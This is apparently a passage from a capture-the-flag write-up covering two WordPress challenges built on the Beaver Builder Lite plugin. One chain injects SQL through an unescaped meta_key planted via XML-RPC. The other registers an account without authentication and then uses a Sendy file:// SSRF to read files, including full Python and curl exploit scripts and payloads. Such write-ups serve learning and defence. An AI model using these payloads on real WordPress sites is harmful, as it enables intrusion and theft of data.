+Then I searched for “smelly” DB operations (raw queries):
+
+```bash
+rg -n '\\$wpdb->query\\(' beaver-builder-lite-version/classes/class-fl-builder-model.php
+```
+
+I found it in `FLBuilderModel::duplicate_post()`:
+
+```php
+$post_meta = $wpdb->get_results(
+  $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id = %d", $post_id )
+);
+
+foreach ( $post_meta as $meta_info ) {
+  $meta_key = $meta_info->meta_key;
+  $meta_value = addslashes( $meta_info->meta_value );
+
+  // VULNERABLE: meta_key is inserted raw into SQL.
+  $wpdb->query(
+    "INSERT INTO {$wpdb->postmeta} (post_id, meta_key, meta_value)
+     values ({$new_post_id}, '{$meta_key}', '{$meta_value}')"
+  );
+}
+```
+
+Key points:
+
+- `meta_value` is escaped (`addslashes`).
+- But `meta_key` is **not escaped** at all.
+- If we can create post meta with a `meta_key` containing `'` + SQL payload, we can *bend* this insert query.
+
+Now the question: as a `contributor`, how do we inject a weird `meta_key`?
+
+---
+
+### Gate 4: XML-RPC = an easy “custom_fields” path for meta injection
+
+WordPress still has XML-RPC enabled (`/xmlrpc.php`), and a `contributor` can use `wp.newPost` to create a draft.
+
+The interesting part: XML-RPC supports `custom_fields` → this directly creates entries in `wp_postmeta` with a `meta_key` of our choosing.
+
+I created a draft post with a `meta_key` prepared for SQLi:
+
+Payload `meta_key`:
+
+```text
+a', (SELECT option_value FROM wp_options WHERE option_name='flaggg'))#
+```
+
+Why does this work?
+
+- We close the `'{$meta_key}'` string with `'` after `a`.
+- We change `meta_value` to be the result of `SELECT option_value ...`.
+- We comment out the rest with `#` so `', '{$meta_value}')` won’t interfere.
+
+Python (xmlrpc) script I made:
+
+```py
+import xmlrpc.client
+
+url = 'http://18.130.76.27:9120/xmlrpc.php'
+user = 'testuser2'
+pw = 'pass1234'
+client = xmlrpc.client.ServerProxy(url, allow_none=True)
+
+inj = "a', (SELECT option_value FROM wp_options WHERE option_name='flaggg'))#"
+
+post = {
+  'post_type': 'post',
+  'post_status': 'draft',
+  'post_title': 'gate-setup',
+  'post_content': 'x',
+  'custom_fields': [{'key': inj, 'value': '1'}],
+}
+
+post_id = client.wp.newPost(1, user, pw, post)
+print('post_id', post_id)
+```
+
+```bash
+python3 post.py
+post_id 23525
+```
+
+At this point, the dangerous meta exists… but it **hasn’t executed yet**. It only “explodes” when `duplicate_post()` is called.
+
+---
+
+### Gate 5: trigger `duplicate_post()` via Beaver Builder front-end AJAX
+
+Beaver Builder has its own “frontend AJAX” (`FLBuilderAJAX`) that requires a nonce named `fl_ajax_update`.
+
+It turns out the nonce can be taken from the builder UI page:
+
+```bash
+curl -sS -L -b /tmp/cj 'http://18.130.76.27:9120/?p=23525&fl_builder' \
+  | rg -n 'FLBuilderConfig\\s*=|ajaxNonce' | head
+```
+
+There’s a snippet like:
+
+```js
+FLBuilderConfig = {
+  ...,
+  "ajaxNonce":"903aacf254",
+  ...
+};
+```
+
+This is the “gate key” to execute builder actions.
+
+To trigger duplication:
+
+```bash
+curl -sS -b /tmp/cj -X POST 'http://18.130.76.27:9120/' \
+  --data 'post_id=23525&fl_action=duplicate_post&_wpnonce=903aacf254'
+```
+
+The response is the new post ID (example: `291`).
+
+And at that point `duplicate_post()` copies all postmeta from post 288 → 291, including the meta_key we created… so the raw query `INSERT ... '{$meta_key}' ...` becomes our “SQL statement”.
+
+---
+
+### Gate 6: read the result (the flag) via XML-RPC
+
+Now the duplicated post (`291`) has a custom field `a` whose value isn’t `1`, but the result of the subquery from `wp_options`:
+
+```py
+import xmlrpc.client
+
+url = 'http://18.130.76.27:9120/xmlrpc.php'
+user = 'testuser2'
+pw = 'pass1234'
+client = xmlrpc.client.ServerProxy(url, allow_none=True)
+
+post = client.wp.getPost(1, user, pw, 291)
+for cf in post.get('custom_fields', []):
+    if cf.get('key') == 'a':
+        print(cf['value'])
+```
+
+Output:
+
+```text
+CTF{red_flare_is_all_i_got_8892103492122}
+```
+
+Game over. All 8 gates opened.
+
+### Flag
+
+`CTF{red_flare_is_all_i_got_8892103492122}`
+
+---
+
+## Izanami
+
+Target: `http://18.130.76.27:9131/`
+
+### Intro
+
+In this write-up I tell the flow like a heist story: starting with recon (sniffing WordPress), finding a side door (user registration via AJAX without a nonce), leveling up into a logged-in user, then “stealing the master key” via Beaver Builder Service → Sendy, which can be forced to read `file://`.
+
+The ending is simple and satisfying: **the flag is read directly from the filesystem**.
+
+---
+
+### Recon: WordPress, plugins, and the habit of “forgetting to lock things”
+
+Since this is whitebox, I started with the provided artifact: `attachment.zip`.
+
+```bash
+ls -la
+unzip attachment.zip
+```
+
+The zip contents point to a WordPress setup + several plugins. To be quick, I used `ripgrep` to search for something “dangerous but common”: `wp_ajax_nopriv_`.
+
+```bash
+rg -n "wp_ajax_nopriv_" -S extracted | head -n 50
+```
+
+And I found a small jackpot in the custom plugin:
+
+- `extracted/server-given/docker/wordpress/toolbox/plugins/test-plugin/test-plugin.php`
+
+```php
+add_action("wp_ajax_nopriv_register_user", "register_user");
+
+function register_user(){
+    $userdata = array(
+        'user_login' => sanitize_text_field($_POST["username"]),
+        'user_pass' => sanitize_text_field($_POST["password"]),
+        'user_email' => sanitize_text_field($_POST["email"]),
+        'role' => 'contributor',
+    );
+
+    wp_insert_user($userdata);
+    echo "user created";
+}
+```
+
+From here it’s clear:
+
+- `nopriv` → can be called without login.
+- no nonce, no captcha, no rate limit.
+- directly calls `wp_insert_user()` with role `contributor`.
+
+So what’s the “infinite loop”? Don’t overthink it. First, create our own user.
+
+The endpoint is standard WordPress:
+
+`POST /wp-admin/admin-ajax.php?action=register_user`
+
+---
+
+### Get in first: create a contributor account (without permission)
+
+Minimal request:
+
+```bash
+curl -i -s -X POST 'http://18.130.76.27:9131/wp-admin/admin-ajax.php' \
+  -d 'action=register_user' \
+  -d 'username=u1337' \
+  -d 'password=p1337' \
+  -d 'email=u1337@example.com'
+```
+
+If successful, the response is “user created”.
+
+After that, log in normally via:
+
+`POST /wp-login.php` (form fields `log` and `pwd`).
+
+At this point we’re “just” a contributor. Not admin, can’t install plugins, but enough for the next step: **access Beaver Builder frontend AJAX**.
+
+---
+
+### Why is Beaver Builder relevant?
+
+In the codebase there’s Beaver Builder Lite (a commonly used version). Remotely, you can usually check via:
+
+`/wp-content/plugins/beaver-builder-lite-version/readme.txt`
+
+What matters isn’t just the version—but the “Services” feature. Beaver Builder has third-party integration (Mailchimp, Sendy, etc) that can be *connected* via an AJAX action named `connect_service`.
+
+In the source:
+
+- `plugin_src/beaver/beaver-builder-lite-version/classes/class-fl-builder-ajax.php`
+- `plugin_src/beaver/beaver-builder-lite-version/classes/class-fl-builder-services.php`
+
+The flow is short:
+
+1) Frontend AJAX handler runs on the `wp` hook (not `wp-admin/admin-ajax.php`):
+
+```php
+add_action( 'wp', __CLASS__ . '::run' );
+```
+
+2) There are guards:
+
+- must be logged in
+- must have nonce `fl_ajax_update`
+- must be able to `edit_post` for the `post_id` used
+
+3) Then it dispatches to `FLBuilderServices::connect_service`.
+
+And this is why we can play as a contributor: contributors can create their own draft post → automatically have `edit_post` capability for that post.
+
+So the strategy:
+
+1) Create a draft post
+2) Grab the Beaver Builder nonce (`ajaxNonce`)
+3) Call `connect_service` while slipping in a payload
+
+---
+
+### Main bug: an “SSRF” that turns into arbitrary read `file://`
+
+The easiest service to abuse here is **Sendy**.
+
+In Beaver Builder, the class is:
+
+- `plugin_src/beaver/beaver-builder-lite-version/classes/services/class-fl-builder-service-sendy.php`
+
+In its vendor library (SendyPHP), the issue is simple: it uses cURL to `$installation_url`… without restricting protocols.
+
+Conceptually:
+
+```php
+$ch = curl_init($installation_url . '/' . $type);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$resp = curl_exec($ch);
+```
+
+If we set `$installation_url` to `file:///etc/passwd#`, cURL will try to “request” a local file on the server. The output (file contents) comes back as `$resp`.
+
+Even funnier: when the connection is considered failed, Beaver Builder’s error message ends up “carrying” that response. So the file content leaks via an error string in JSON.
+
+This is purely: **payload → cURL → error string → we read it**.
+
+---
+
+### Exploit chain (end-to-end) — the key part: nonce + post_id
+
+Because Beaver Builder frontend AJAX needs the `fl_ajax_update` nonce, we need two nonces:
+
+1) WordPress REST API nonce (`wpApiSettings.nonce`) to create a draft post via `/wp-json/wp/v2/posts`
+2) Beaver Builder nonce (`FLBuilderConfig.ajaxNonce`) to call `connect_service`
+
+Below is a Python script that does everything:
+
+```py
+import json, re, secrets
+import requests
+
+BASE = "http://18.130.76.27:9131"
+FLAG_PATH = "/flag-7hW4jxYnFouPxRhWLhVp.txt"
+
+s = requests.Session()
+
+# 1) register contributor (unauth)
+username = "u" + secrets.token_hex(4)
+password = "p" + secrets.token_hex(8)
+email = f"{username}@example.com"
+s.post(f"{BASE}/wp-admin/admin-ajax.php", data={
+  "action":"register_user",
+  "username": username,
+  "password": password,
+  "email": email,
+})
+
+# 2) login
+s.get(f"{BASE}/wp-login.php")
+s.post(f"{BASE}/wp-login.php", data={
+  "log": username,
+  "pwd": password,
+  "wp-submit": "Log In",
+  "redirect_to": f"{BASE}/wp-admin/",
+  "testcookie": "1",
+})
+
+# 3) grab REST nonce
+html = s.get(f"{BASE}/wp-admin/post-new.php").text
+wp_api = json.loads(re.search(r"wpApiSettings\\s*=\\s*(\\{.*?\\});", html, re.S).group(1))
+wp_nonce = wp_api["nonce"]
+
+# 4) create draft post (so we can edit it)
+r = s.post(f"{BASE}/wp-json/wp/v2/posts",
+           headers={"X-WP-Nonce": wp_nonce, "Content-Type":"application/json"},
+           data=json.dumps({"title":"x","content":"x","status":"draft"}))
+post_id = r.json()["id"]
+
+# 5) grab Beaver Builder ajaxNonce
+html = s.get(f"{BASE}/?p={post_id}&fl_builder").text
+ajax_nonce = re.search(r"\"ajaxNonce\"\\s*:\\s*\"([^\"]+)\"", html).group(1)
+
+# 6) file:// read via Sendy connect_service
+service_account = "pwn" + secrets.token_hex(3)
+resp = s.post(f"{BASE}/?p={post_id}&fl_builder", data={
+  "fl_action": "connect_service",
+  "_wpnonce": ajax_nonce,
+  "fl_builder_data[post_id]": str(post_id),
+  "fl_builder_data[service]": "sendy",
+  "fl_builder_data[fields][service_account]": service_account,
+  "fl_builder_data[fields][api_host]": f"file://{FLAG_PATH}#",
+  "fl_builder_data[fields][api_key]": "x",
+  "fl_builder_data[fields][list_id]": "x",
+}).json()
+
+print(resp["error"])  # contains file contents
+```
+
+Run:
+
+```bash
+python3 solve.py
+```
+
+If the target is the same, the error output will contain the flag.
+
+---
+
+### A funny little twist: the “flag name” was found from directory listing
+
+Before reading the flag, I tried “searching the root directory” first:
+
+`file:///` often returns directory listing text (depending on wrapper & build). And in this case the listing was readable, so the flag filename showed up immediately:
+
+`flag-7hW4jxYnFouPxRhWLhVp.txt`
+
+After getting the name, just read the file with the payload `file:///flag-...txt#`.
+
+---
+
+### Flag
+
+`CTF{can_you_break_this_infinite_loop_645271829bdbd}`
+
+---
